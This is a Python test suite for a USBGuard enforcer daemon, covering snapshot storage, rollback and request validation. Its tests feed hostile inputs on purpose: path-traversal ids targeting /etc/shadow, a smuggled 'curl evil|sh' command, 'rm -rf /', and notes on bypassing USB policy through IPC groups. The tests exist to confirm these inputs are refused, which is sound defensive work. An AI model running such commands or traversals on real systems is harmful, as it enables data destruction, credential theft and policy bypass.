"""Tests for the enforcer operation layer, OS adapter and snapshot store.

The fake host these run against lives in `enforcer_helpers.FakeHost`, which
models the behaviour that matters -- a daemon restart loads whatever is in the
rules file -- and can be switched into the specific ways a real host
misbehaves. None of these need root, usbguard or a running daemon.
"""

from __future__ import annotations

import datetime as dt
import json
import stat
import tempfile
import unittest
from pathlib import Path

from enforcer_helpers import (
    DAEMON_CONF,
    GNOME_RULE,
    NOW,
    EnforcerFixture,
    base_payload,
    effective,
)
from ubuntuguard_agent.enforcer import derive, intent, ops, snapshots, system

# ---------------------------------------------------------------------------
# snapshot store
# ---------------------------------------------------------------------------


class TestSnapshotStore(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = snapshots.SnapshotStore(
            directory=str(Path(self.tmp.name) / "snaps"), retention=3
        )

    def take(self, text="allow id 0781:5583", note="", now=NOW):
        return self.store.take(
            rules_text=text,
            daemon_params={"ImplicitPolicyTarget": "block"},
            rules_fingerprint="deadbeef",
            note=note,
            now=now,
        )

    def test_take_and_load_round_trip(self):
        snap = self.take(text="block with-interface one-of { 08:*:* }")
        loaded = self.store.load(snap.snapshot_id)
        self.assertEqual(loaded.rules_text, snap.rules_text)
        self.assertEqual(loaded.daemon_params, {"ImplicitPolicyTarget": "block"})
        self.assertEqual(loaded.rules_fingerprint, "deadbeef")

    def test_generated_id_matches_the_accepted_pattern(self):
        snap = self.take()
        self.assertRegex(snap.snapshot_id, snapshots.SNAPSHOT_ID_RE)

    def test_store_directory_is_root_only(self):
        self.take()
        mode = stat.S_IMODE(Path(self.store.directory).stat().st_mode)
        self.assertEqual(mode, snapshots.STORE_MODE)

    def test_snapshot_file_is_not_world_readable(self):
        snap = self.take()
        path = Path(self.store.directory) / f"{snap.snapshot_id}.json"
        mode = stat.S_IMODE(Path(path).stat().st_mode)
        self.assertEqual(mode, snapshots.SNAPSHOT_MODE)
        self.assertFalse(mode & stat.S_IROTH, "snapshot is world-readable")

    # -- the attacker-controlled id ---------------------------------------

    def test_path_traversal_ids_are_refused(self):
        """snapshot_id arrives over the socket from an unprivileged process.

        Were it used as a path component unchecked, these would give a
        compromised agentd arbitrary file reads through root.
        """
        hostile = [
            "../../../../etc/shadow",
            "../snapshots/x",
            "/etc/passwd",
            "20261029T100000Z-aaaaaaaa/../../x",
            "..",
            ".",
            "",
            "20261029T100000Z-aaaaaaaa\x00.json",
            "20261029T100000Z-AAAAAAAA",  # uppercase hex is not the format
            "20261029T100000Z-aaaaaaa",  # one hex digit short
            "not-a-timestamp-aaaaaaaa",
        ]
        for bad in hostile:
            with self.subTest(snapshot_id=bad):
                with self.assertRaises(snapshots.SnapshotError) as caught:
                    self.store.load(bad)
                self.assertEqual(caught.exception.reason_code, "invalid_snapshot_id")

    def test_non_string_id_is_refused(self):
        for bad in (None, 7, ["x"], {"a": 1}):
            with (
                self.subTest(snapshot_id=bad),
                self.assertRaises(snapshots.SnapshotError),
            ):
                self.store.load(bad)  # type: ignore[arg-type]

    def test_absent_snapshot_reports_not_found(self):
        with self.assertRaises(snapshots.SnapshotError) as caught:
            self.store.load("20261029T100000Z-abcdef01")
        self.assertEqual(caught.exception.reason_code, "snapshot_not_found")

    def test_corrupt_snapshot_reports_unreadable(self):
        snap = self.take()
        path = Path(self.store.directory) / f"{snap.snapshot_id}.json"
        path.write_text("{not json", encoding="utf-8")
        with self.assertRaises(snapshots.SnapshotError) as caught:
            self.store.load(snap.snapshot_id)
        self.assertEqual(caught.exception.reason_code, "snapshot_unreadable")

    def test_snapshot_without_rules_body_is_unreadable(self):
        snap = self.take()
        path = Path(self.store.directory) / f"{snap.snapshot_id}.json"
        path.write_text(json.dumps({"taken_at": "x"}), encoding="utf-8")
        with self.assertRaises(snapshots.SnapshotError) as caught:
            self.store.load(snap.snapshot_id)
        self.assertEqual(caught.exception.reason_code, "snapshot_unreadable")

    # -- ordering and retention -------------------------------------------

    def test_ids_are_newest_first(self):
        made = [self.take(now=NOW + dt.timedelta(seconds=index)).snapshot_id for index in range(3)]
        self.assertEqual(self.store.ids(), list(reversed(made)))

    def test_retention_keeps_only_the_newest(self):
        for index in range(8):
            self.take(now=NOW + dt.timedelta(seconds=index))
        self.assertEqual(len(self.store.ids()), 3)

    def test_latest_returns_the_newest(self):
        self.take(text="old", now=NOW)
        newest = self.take(text="new", now=NOW + dt.timedelta(seconds=5))
        latest = self.store.latest()
        self.assertIsNotNone(latest)
        self.assertEqual(latest.snapshot_id, newest.snapshot_id)  # type: ignore
        self.assertEqual(latest.rules_text, "new")  # type: ignore

    def test_latest_skips_a_corrupt_newest_snapshot(self):
        """Rollback runs when things are already wrong.

        A corrupt newest snapshot must not hide a usable older one.
        """
        older = self.take(text="usable", now=NOW)
        newer = self.take(text="corrupt", now=NOW + dt.timedelta(seconds=5))
        (Path(self.store.directory) / f"{newer.snapshot_id}.json").write_text(
            "{broken", encoding="utf-8"
        )
        latest = self.store.latest()
        self.assertIsNotNone(latest)
        self.assertEqual(latest.snapshot_id, older.snapshot_id)  # type: ignore

    def test_summary_withholds_the_rules_body(self):
        snap = self.take(text="# comment\nallow id 0781:5583\nblock")
        summary = snap.summary()
        self.assertNotIn("rules_text", summary)
        self.assertEqual(summary["rule_count"], 2)

    def test_ids_ignores_unrelated_files(self):
        self.take()
        Path(self.store.directory, "notes.txt").write_text("x", encoding="utf-8")
        Path(self.store.directory, "bogus.json").write_text("{}", encoding="utf-8")
        self.assertEqual(len(self.store.ids()), 1)


# ---------------------------------------------------------------------------
# OS adapter
# ---------------------------------------------------------------------------


class TestCapabilities(EnforcerFixture):
    def test_fully_equipped_host_is_supported(self):
        caps = self.system.capabilities()
        self.assertTrue(caps.supported)
        self.assertEqual(caps.missing, ())
        self.assertEqual(caps.usbguard_version, "1.1.4")

    def test_version_is_the_number_only(self):
        """`usbguard --version` prints build flags after the version."""
        caps = self.system.capabilities()
        self.assertEqual(caps.usbguard_version, "1.1.4")

    def test_missing_usbguard_is_unsupported_and_named(self):
        self.host.has_usbguard = False
        caps = self.system.capabilities()
        self.assertFalse(caps.supported)
        self.assertIn("usbguard binary", caps.missing)
        self.assertIsNone(caps.usbguard_version)

    def test_missing_unit_is_unsupported(self):
        self.host.unit_present = False
        caps = self.system.capabilities()
        self.assertFalse(caps.supported)
        self.assertIn("usbguard.service unit", caps.missing)

    def test_missing_systemctl_is_unsupported(self):
        self.host.has_systemctl = False
        caps = self.system.capabilities()
        self.assertFalse(caps.supported)
        self.assertIn("systemctl", caps.missing)

    def test_unwritable_rules_path_is_unsupported(self):
        unwritable = Path(self.tmp.name) / "nonexistent-dir" / "rules.conf"
        adapter = system.UsbGuardSystem(
            rules_path=str(unwritable),
            daemon_conf_path=str(self.daemon_conf),
            runner=self.host.runner,
            which=self.host.which,
        )
        caps = adapter.capabilities()
        self.assertFalse(caps.supported)
        self.assertFalse(caps.rules_writable)

    def test_inactive_daemon_is_still_supported(self):
        """enforcerd starts the daemon, so it need not already be running."""
        self.host.active = False
        caps = self.system.capabilities()
        self.assertTrue(caps.supported)
        self.assertFalse(caps.daemon_active)

    def test_require_supported_raises_capability_missing(self):
        self.host.has_usbguard = False
        with self.assertRaises(system.HostError) as caught:
            self.system.require_supported()
        self.assertEqual(caught.exception.reason_code, "capability_missing")

    def test_no_apt_or_install_command_is_ever_run(self):
        """enforcerd must not install packages. Her threat model forbids it.

        The older agent in this repo would apt-get install usbguard; that
        behaviour must not have followed the code into this component.
        """
        self.host.has_usbguard = False
        self.system.capabilities()
        self.enforcer.handle({"op": ops.OP_USB_SET_POLICY, "payload": {"policy": base_payload()}})
        flat = [" ".join(call) for call in self.host.calls]
        for call in flat:
            self.assertNotIn("apt", call)
            self.assertNotIn("install", call)
            self.assertNotIn("dpkg", call)


class TestStateReadback(EnforcerFixture):
    def test_loaded_rules_have_their_index_stripped(self):
        self.host.loaded = ["allow id 0781:5583", "block with-interface one-of { 08:*:* }"]
        self.assertEqual(
            self.system.loaded_rules(),
            ("allow id 0781:5583", "block with-interface one-of { 08:*:* }"),
        )

    def test_daemon_params_are_parsed(self):
        params = self.system.daemon_params()
        self.assertEqual(params["ImplicitPolicyTarget"], "block")
        self.assertEqual(params["PresentDevicePolicy"], "apply-policy")

    def test_daemon_params_ignores_unlisted_and_commented_keys(self):
        params = self.system.daemon_params()
        self.assertNotIn("RuleFile", params)
        self.assertNotIn("IPCAccessControlFiles", params)

    def test_missing_daemon_conf_yields_empty_params(self):
        self.daemon_conf.unlink()
        self.assertEqual(self.system.daemon_params(), {})

    def test_devices_are_parsed_with_targets_and_classes(self):
        devices = self.system.devices()
        self.assertEqual(len(devices), 2)
        drive = [d for d in devices if d["usb_id"] == "03f0:1985"][0]
        self.assertEqual(drive["target"], "block")
        self.assertEqual(drive["serial"], "070D5867E317C137")
        self.assertEqual(drive["name"], "USB Flash Drive")
        self.assertEqual(drive["via_port"], "1-3")
        self.assertEqual(drive["classes"], ["08"])

    def test_devices_empty_when_usbguard_fails(self):
        self.host.has_usbguard = False
        self.assertEqual(self.system.devices(), ())

    def test_missing_rules_file_reads_as_empty(self):
        self.assertEqual(self.system.read_rules_file(), "")

    def test_readable_daemon_conf_is_reported_as_readable(self):
        _, readable = self.system.read_daemon_conf()
        self.assertTrue(readable)

    def test_unreadable_daemon_conf_is_not_mistaken_for_a_clean_one(self):
        """Unknown is a third answer, distinct from "nothing worrying here".

        Collapsing it into False would be the same false green the IPC check
        exists to prevent.
        """
        self.daemon_conf.unlink()
        state = self.system.state()
        self.assertFalse(state.daemon_conf_readable)
        self.assertIsNone(state.as_dict()["enforcement_bypassable_without_root"])

    def test_clean_daemon_conf_reports_false_not_none(self):
        state = self.system.state()
        self.assertTrue(state.daemon_conf_readable)
        self.assertIs(state.as_dict()["enforcement_bypassable_without_root"], False)


class TestIpcExposure(unittest.TestCase):
    """Who may replace the policy, which decides whether it means anything.

    USBGuard's `IPCAllowedUsers` and `IPCAllowedGroups` grant full IPC access,
    so anyone covered can append an allow-everything rule or authorise the
    specific device the policy blocked, with no root. Verified on a live host:
    `usbguard append-rule` from an unprivileged account in plugdev succeeded
    and returned a new rule id.
    """

    def test_root_only_is_not_an_exposure(self):
        self.assertEqual(system.ipc_exposure({"IPCAllowedUsers": "root"}), ())

    def test_no_ipc_settings_is_not_an_exposure(self):
        self.assertEqual(system.ipc_exposure({}), ())
        self.assertEqual(
            system.ipc_exposure({"IPCAllowedUsers": "", "IPCAllowedGroups": ""}),
            (),
        )

    def test_plugdev_group_is_flagged(self):
        """The configuration the earlier agent in this repo installed.

        The primary user of an Ubuntu desktop is normally in plugdev, so this
        hands the policy's off switch to the person it restricts.
        """
        self.assertEqual(
            system.ipc_exposure({"IPCAllowedGroups": "plugdev"}),
            ("IPCAllowedGroups=plugdev",),
        )

    def test_non_root_user_is_flagged(self):
        self.assertEqual(
            system.ipc_exposure({"IPCAllowedUsers": "root alice"}),
            ("IPCAllowedUsers=alice",),
        )

    def test_several_principals_are_all_named(self):
        findings = system.ipc_exposure(
            {"IPCAllowedUsers": "root bob", "IPCAllowedGroups": "plugdev wheel"}
        )
        self.assertEqual(
            findings,
            (
                "IPCAllowedUsers=bob",
                "IPCAllowedGroups=plugdev",
                "IPCAllowedGroups=wheel",
            ),
        )


class TestRuleInstallation(EnforcerFixture):
    def test_written_rules_are_not_world_readable(self):
        """rules.conf names the authorised devices.

        A readable copy tells an attacker which device to clone, so the mode
        is asserted rather than left to umask.
        """
        self.system.write_rules("allow id 0781:5583\n")
        mode = stat.S_IMODE(Path(self.rules_path).stat().st_mode)
        self.assertEqual(mode, system.RULES_MODE)
        self.assertFalse(mode & stat.S_IROTH)
        self.assertFalse(mode & stat.S_IRGRP)

    def test_write_leaves_no_temporary_files_behind(self):
        self.system.write_rules("allow id 0781:5583\n")
        leftovers = list(self.rules_path.parent.glob("*.tmp"))
        self.assertEqual(leftovers, [])

    def test_write_replaces_existing_content(self):
        self.system.write_rules("first\n")
        self.system.write_rules("second\n")
        self.assertEqual(self.rules_path.read_text(encoding="utf-8"), "second\n")

    def test_parser_rejection_surfaces_as_enforce_failed(self):
        self.host.parser_rejects = True
        self.system.write_rules("garbage\n")
        with self.assertRaises(system.HostError) as caught:
            self.system.validate_rules_file()
        self.assertEqual(caught.exception.reason_code, "enforce_failed")

    def test_validation_is_skipped_when_parser_absent(self):
        self.host.has_parser = False
        self.host.parser_rejects = True
        self.system.validate_rules_file()  # must not raise

    def test_failed_restart_surfaces_as_enforce_failed(self):
        self.host.restart_fails = True
        with self.assertRaises(system.HostError) as caught:
            self.system.reload_daemon()
        self.assertEqual(caught.exception.reason_code, "enforce_failed")

    def test_daemon_dying_after_restart_is_detected(self):
        """`systemctl restart` can exit 0 for a daemon that then exits."""
        self.host.dies_after_restart = True
        with self.assertRaises(system.HostError) as caught:
            self.system.reload_daemon()
        self.assertIn("did not stay active", str(caught.exception))


# ---------------------------------------------------------------------------
# dispatch and the closed operation set
# ---------------------------------------------------------------------------


class TestDispatch(EnforcerFixture):
    def test_unknown_operation_is_refused(self):
        response = self.enforcer.handle({"op": "OP_RUN_SHELL"})
        self.assertEqual(response["status"], ops.STATUS_FAILED)
        self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_rejection_message_does_not_echo_the_payload(self):
        """Rejections are logged with the opcode, never the contents.

        A rejected payload is the one most likely to be hostile, and echoing
        it into a log is how it reaches a log viewer.
        """
        secret = "s3cret-serial-ABCDEF"
        response = self.enforcer.handle(
            {"op": "OP_EVIL", "payload": {"policy": {"serial": secret}}}
        )
        self.assertNotIn(secret, json.dumps(response))

    def test_missing_operation_is_refused(self):
        for request in ({}, {"op": None}, {"op": ""}, {"op": 7}):
            with self.subTest(request=request):
                response = self.enforcer.handle(request)
                self.assertEqual(response["status"], ops.STATUS_FAILED)

    def test_non_object_request_is_refused(self):
        for request in (None, "OP_CAPABILITIES", ["OP_CAPABILITIES"], 7):
            with self.subTest(request=request):
                response = self.enforcer.handle(request)
                self.assertEqual(response["status"], ops.STATUS_FAILED)
                self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_unknown_request_field_is_refused(self):
        """The same allowlisting as the payload, one level up.

        A request growing a `rules_path` must be refused, not ignored.
        """
        for field in ("rules_path", "command", "rules", "post_apply_command"):
            with self.subTest(field=field):
                response = self.enforcer.handle({"op": ops.OP_CAPABILITIES, field: "/etc/passwd"})
                self.assertEqual(response["status"], ops.STATUS_FAILED)
                self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_unknown_set_policy_payload_field_is_refused(self):
        response = self.enforcer.handle(
            {
                "op": ops.OP_USB_SET_POLICY,
                "payload": {"policy": base_payload(), "rules_path": "/etc/x"},
            }
        )
        self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_unknown_rollback_payload_field_is_refused(self):
        response = self.enforcer.handle(
            {
                "op": ops.OP_USB_ROLLBACK,
                "payload": {"snapshot_id": "20261029T100000Z-abcdef01", "rules": "allow all"},
            }
        )
        self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_every_response_carries_a_status_and_timestamp(self):
        for request in (
            {"op": ops.OP_CAPABILITIES},
            {"op": ops.OP_USB_GET_STATE},
            {"op": "OP_NOPE"},
        ):
            with self.subTest(op=request["op"]):
                response = self.enforcer.handle(request)
                self.assertIn("status", response)
                self.assertIn("at", response)

    def test_responses_are_json_serialisable(self):
        """The transport will serialise these, so they must survive it."""
        self.set_policy()
        for request in (
            {"op": ops.OP_CAPABILITIES},
            {"op": ops.OP_USB_GET_STATE},
            {"op": ops.OP_USB_SET_POLICY, "payload": {"policy": base_payload()}},
        ):
            with self.subTest(op=request["op"]):
                json.dumps(self.enforcer.handle(request))


class TestCapabilitiesOp(EnforcerFixture):
    def test_reports_capabilities(self):
        response = self.enforcer.handle({"op": ops.OP_CAPABILITIES})
        self.assertEqual(response["status"], ops.STATUS_OK)
        self.assertTrue(response["capabilities"]["supported"])
        self.assertEqual(response["capabilities"]["usbguard_version"], "1.1.4")

    def test_reports_unsupported_host_without_failing(self):
        """A host with no usbguard is a fact to report, not an error."""
        self.host.has_usbguard = False
        response = self.enforcer.handle({"op": ops.OP_CAPABILITIES})
        self.assertEqual(response["status"], ops.STATUS_OK)
        self.assertFalse(response["capabilities"]["supported"])
        self.assertIn("usbguard binary", response["capabilities"]["missing"])


class TestGetStateOp(EnforcerFixture):
    def test_reports_state_after_an_apply(self):
        self.set_policy()
        response = self.enforcer.handle({"op": ops.OP_USB_GET_STATE})
        self.assertEqual(response["status"], ops.STATUS_OK)
        self.assertGreater(response["state"]["loaded_rule_count"], 0)
        self.assertTrue(response["fingerprint_self_consistent"])

    def test_detects_a_hand_edited_rules_file(self):
        """Tamper-evidence: the fingerprint no longer matches the body."""
        self.set_policy()
        text = self.rules_path.read_text(encoding="utf-8")
        self.rules_path.write_text(
            text + "allow with-interface one-of { 08:*:* }\n", encoding="utf-8"
        )
        response = self.enforcer.handle({"op": ops.OP_USB_GET_STATE})
        self.assertFalse(response["fingerprint_self_consistent"])

    def test_unsupported_host_reports_unsupported_not_empty_state(self):
        """ "No rules loaded" must not be mistaken for "policy applied"."""
        self.host.has_usbguard = False
        response = self.enforcer.handle({"op": ops.OP_USB_GET_STATE})
        self.assertEqual(response["status"], ops.STATUS_UNSUPPORTED)
        self.assertEqual(response["reason_code"], "capability_missing")
        self.assertNotIn("state", response)

    def test_lists_snapshots(self):
        self.set_policy()
        response = self.enforcer.handle({"op": ops.OP_USB_GET_STATE})
        self.assertEqual(len(response["snapshots"]), 1)
        self.assertNotIn("rules_text", response["snapshots"][0])


# ---------------------------------------------------------------------------
# applying policy
# ---------------------------------------------------------------------------


class TestSetPolicy(EnforcerFixture):
    def test_applies_and_verifies(self):
        response = self.set_policy(policy_version=7)
        self.assertEqual(response["status"], ops.STATUS_APPLIED)
        self.assertEqual(response["policy_version"], 7)
        self.assertEqual(response["mode"], intent.MODE_ALLOWLIST)
        self.assertGreater(response["rules_applied"], 0)

    def test_installed_file_matches_the_derived_policy(self):
        self.set_policy()
        parsed = intent.parse(base_payload(), now=NOW)
        self.assertEqual(
            effective(self.rules_path.read_text(encoding="utf-8")),
            derive.derive_rules(parsed, now=NOW),
        )

    def test_blocks_storage_in_enforcing_mode(self):
        self.set_policy()
        body = effective(self.rules_path.read_text(encoding="utf-8"))
        self.assertIn("block with-interface one-of { 08:*:* }", body)

    def test_monitor_mode_blocks_nothing(self):
        self.set_policy(base_payload(mode=intent.MODE_MONITOR))
        body = effective(self.rules_path.read_text(encoding="utf-8"))
        self.assertFalse(
            [line for line in body if line.startswith("block")],
            "monitor_only installed a block rule",
        )

    def test_response_carries_the_default_allow_caveat(self):
        """The trailing-allow semantics travel with every applied response.

        It is the one behaviour of this policy a reader is most likely to get
        wrong, so it should not require reading the source to discover.
        """
        response = self.set_policy()
        self.assertEqual(response["note"], derive.TRAILING_ALLOW_NOTE)

    def test_gnome_rule_appended_after_the_policy_still_applies(self):
        """The case that occurs on every Ubuntu desktop.

        `gsd-usb-protection` appends an allow-everything rule after the
        daemon loads our file. Behind the policy it is inert, because the
        policy blocks the protected classes and ends with a catch-all for
        everything else, so no device ever reaches it. Treating it as drift
        would roll back every apply on the exact machines this ships to.
        """
        self.host.appends_after = [GNOME_RULE]
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_APPLIED)

    def test_foreign_rules_are_reported_not_hidden(self):
        self.host.appends_after = [GNOME_RULE]
        response = self.set_policy()
        self.assertEqual(response["foreign_rules"], [GNOME_RULE])

    def test_no_foreign_rules_on_a_clean_host(self):
        response = self.set_policy()
        self.assertEqual(response["foreign_rules"], [])

    def test_apply_reports_a_bypassable_host(self):
        """An apply that succeeds on a host where the user can undo it must
        say so on the response, not only when someone asks for state."""
        self.daemon_conf.write_text(DAEMON_CONF + "IPCAllowedGroups=plugdev\n", encoding="utf-8")
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_APPLIED)
        self.assertEqual(response["ipc_exposure"], ["IPCAllowedGroups=plugdev"])

    def test_apply_reports_no_exposure_on_a_locked_down_host(self):
        response = self.set_policy()
        self.assertEqual(response["ipc_exposure"], [])

    def test_get_state_flags_a_bypassable_host(self):
        self.daemon_conf.write_text(DAEMON_CONF + "IPCAllowedGroups=plugdev\n", encoding="utf-8")
        self.set_policy()
        response = self.enforcer.handle({"op": ops.OP_USB_GET_STATE})
        self.assertTrue(response["state"]["enforcement_bypassable_without_root"])

    def test_fingerprint_matches_the_installed_file(self):
        response = self.set_policy()
        self.assertEqual(
            response["rules_fingerprint"],
            derive.extract_fingerprint(self.rules_path.read_text(encoding="utf-8")),
        )

    def test_a_snapshot_is_taken_before_applying(self):
        self.rules_path.write_text("allow id 1111:2222\n", encoding="utf-8")
        response = self.set_policy()
        snapshot = self.store.load(response["snapshot"]["snapshot_id"])
        self.assertEqual(snapshot.rules_text, "allow id 1111:2222\n")

    def test_first_apply_on_a_clean_host_snapshots_the_empty_state(self):
        """ "There was no policy here" is a real rollback target."""
        response = self.set_policy()
        snapshot = self.store.load(response["snapshot"]["snapshot_id"])
        self.assertEqual(snapshot.rules_text, "")

    def test_invalid_payload_is_rejected_before_anything_privileged(self):
        response = self.set_policy(base_payload(always_allow_classes=["hub"]))
        self.assertEqual(response["status"], ops.STATUS_FAILED)
        self.assertEqual(response["reason_code"], "enforcer_rejected")
        self.assertFalse(self.rules_path.exists(), "wrote rules despite rejection")
        self.assertEqual(self.store.ids(), [], "snapshotted despite rejection")

    def test_rejection_lists_every_problem(self):
        response = self.set_policy({"schema": "wrong", "mode": "nope", "protected_classes": []})
        self.assertEqual(response["reason_code"], "enforcer_rejected")
        self.assertGreater(len(response["problems"]), 1)

    def test_payload_smuggling_a_command_is_rejected(self):
        """Her command_injection_attempt fixture, through the op layer."""
        payload = base_payload()
        payload["post_apply_command"] = "/bin/sh -c 'curl evil|sh'"
        response = self.set_policy(payload)
        self.assertEqual(response["reason_code"], "enforcer_rejected")
        self.assertFalse(self.rules_path.exists())

    def test_non_object_policy_is_rejected(self):
        for bad in (None, "allow all", ["x"], 7):
            with self.subTest(policy=bad):
                response = self.enforcer.handle(
                    {"op": ops.OP_USB_SET_POLICY, "payload": {"policy": bad}}
                )
                self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_non_integer_policy_version_is_rejected(self):
        response = self.set_policy(policy_version="7; rm -rf /")
        self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_unsupported_host_reports_unsupported_and_writes_nothing(self):
        self.host.has_usbguard = False
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_UNSUPPORTED)
        self.assertEqual(response["reason_code"], "capability_missing")
        self.assertFalse(self.rules_path.exists())
        self.assertEqual(self.store.ids(), [])


class TestApplyFailureRollsBack(EnforcerFixture):
    """The failure paths, which are the reason the snapshot exists."""

    def setUp(self):
        super().setUp()
        self.previous = "allow id 1111:2222\n"
        self.rules_path.write_text(self.previous, encoding="utf-8")
        self.host.loaded = ["allow id 1111:2222"]

    def test_transiently_failed_restart_rolls_back(self):
        """The restart fails once, then the rollback's restart succeeds."""
        self.host.restart_fails_times = 1
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)
        self.assertEqual(response["reason_code"], "enforce_failed")
        self.assertEqual(self.rules_path.read_text(encoding="utf-8"), self.previous)

    def test_persistently_failed_restart_cannot_verify_its_own_rollback(self):
        """A daemon that never restarts leaves the host in a chosen-by-nobody
        state, and saying so is the only honest answer.

        The rollback writes the old rules back but cannot confirm they took
        effect, because confirming requires the restart that is failing. Her
        design is explicit that this is an incident rather than something to
        retry quietly.
        """
        self.host.restart_fails = True
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_FAILED)
        self.assertEqual(response["reason_code"], "rollback_failed")
        self.assertTrue(response["incident"])
        # The original cause must survive into the incident message, or the
        # alert says only that rollback failed and not what started it.
        self.assertIn("enforce_failed", response["message"])

    def test_parser_rejection_rolls_back(self):
        self.host.parser_rejects = True
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)

    def test_daemon_loading_nothing_is_caught_despite_exit_zero(self):
        """The case her design calls out: exit code 0 is not evidence.

        Every command succeeds, and the policy is not in effect.
        """
        self.host.restart_loads_nothing = True
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)
        self.assertEqual(response["reason_code"], "verify_failed")

    def test_daemon_loading_different_rules_is_caught_as_drift(self):
        self.host.loads_instead = ["allow with-interface one-of { 08:*:* }"]
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)
        self.assertEqual(response["reason_code"], "verify_drift")

    def test_policy_split_apart_is_drift(self):
        """First-match-wins makes a rule spliced into the middle decisive."""
        parsed = intent.parse(base_payload(), now=NOW)
        expected = derive.derive_rules(parsed, now=NOW)
        self.host.loads_instead = [
            expected[0],
            GNOME_RULE,
            *expected[1:],
        ]
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)
        self.assertEqual(response["reason_code"], "verify_drift")

    def test_rule_loaded_before_the_policy_is_drift(self):
        """GNOME's rule is `allow id *:*`.

        Ahead of the policy it would authorise every device, including the
        storage the policy exists to block. Tolerating extra rules without
        regard to position would let that pass as a successful apply.
        """
        parsed = intent.parse(base_payload(), now=NOW)
        self.host.loads_instead = [
            GNOME_RULE,
            *derive.derive_rules(parsed, now=NOW),
        ]
        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)
        self.assertEqual(response["reason_code"], "verify_drift")
        self.assertIn("evaluated before the policy", response["message"])

    def test_rollback_restores_the_previous_rules(self):
        self.host.restart_loads_nothing = True
        self.set_policy()
        self.assertEqual(self.rules_path.read_text(encoding="utf-8"), self.previous)

    def test_unverifiable_rollback_reports_an_incident(self):
        """If the undo cannot be verified, that is an alert, not a retry."""

        def refuse_second_write(text, _calls=[]):  # noqa: B006
            _calls.append(text)
            if len(_calls) > 1:
                raise system.HostError("rollback_failed", "disk is read-only")
            self.rules_path.write_text(text, encoding="utf-8")

        self.host.restart_loads_nothing = True
        self.system.write_rules = refuse_second_write  # type: ignore[assignment]

        response = self.set_policy()
        self.assertEqual(response["status"], ops.STATUS_FAILED)
        self.assertEqual(response["reason_code"], "rollback_failed")
        self.assertTrue(response["incident"])

    def test_failure_message_names_the_original_cause(self):
        self.host.restart_loads_nothing = True
        response = self.set_policy()
        self.assertIn("no loaded rules", response["message"])


class TestRollbackOp(EnforcerFixture):
    def test_rolls_back_to_a_named_snapshot(self):
        self.rules_path.write_text("allow id 1111:2222\n", encoding="utf-8")
        applied = self.set_policy()
        snapshot_id = applied["snapshot"]["snapshot_id"]

        response = self.enforcer.handle(
            {"op": ops.OP_USB_ROLLBACK, "payload": {"snapshot_id": snapshot_id}}
        )
        self.assertEqual(response["status"], ops.STATUS_ROLLED_BACK)
        self.assertEqual(self.rules_path.read_text(encoding="utf-8"), "allow id 1111:2222\n")

    def test_traversal_snapshot_id_is_refused(self):
        """The id is the only field, and it comes from a process the threat
        model treats as compromisable."""
        for bad in ("../../etc/shadow", "/etc/passwd", "..", "x"):
            with self.subTest(snapshot_id=bad):
                response = self.enforcer.handle(
                    {"op": ops.OP_USB_ROLLBACK, "payload": {"snapshot_id": bad}}
                )
                self.assertEqual(response["status"], ops.STATUS_FAILED)
                self.assertEqual(response["reason_code"], "invalid_snapshot_id")

    def test_unknown_snapshot_is_refused(self):
        response = self.enforcer.handle(
            {
                "op": ops.OP_USB_ROLLBACK,
                "payload": {"snapshot_id": "20261029T100000Z-abcdef01"},
            }
        )
        self.assertEqual(response["reason_code"], "snapshot_not_found")

    def test_non_string_snapshot_id_is_refused(self):
        response = self.enforcer.handle(
            {"op": ops.OP_USB_ROLLBACK, "payload": {"snapshot_id": None}}
        )
        self.assertEqual(response["reason_code"], "enforcer_rejected")

    def test_rollback_cannot_carry_rules(self):
        """The op takes an id, never a body.

        This is the property that stops a compromised agentd installing
        arbitrary USBGuard rules through root.
        """
        self.rules_path.write_text("allow id 1111:2222\n", encoding="utf-8")
        applied = self.set_policy()
        hostile = "allow with-interface one-of { 08:*:* }"
        response = self.enforcer.handle(
            {
                "op": ops.OP_USB_ROLLBACK,
                "payload": {
                    "snapshot_id": applied["snapshot"]["snapshot_id"],
                    "rules_text": hostile,
                },
            }
        )
        self.assertEqual(response["reason_code"], "enforcer_rejected")
        self.assertNotIn(hostile, self.rules_path.read_text(encoding="utf-8"))

    def test_unsupported_host_cannot_roll_back(self):
        self.rules_path.write_text("allow id 1111:2222\n", encoding="utf-8")
        applied = self.set_policy()
        self.host.has_usbguard = False
        response = self.enforcer.handle(
            {
                "op": ops.OP_USB_ROLLBACK,
                "payload": {"snapshot_id": applied["snapshot"]["snapshot_id"]},
            }
        )
        self.assertEqual(response["status"], ops.STATUS_UNSUPPORTED)


if __name__ == "__main__":
    unittest.main()
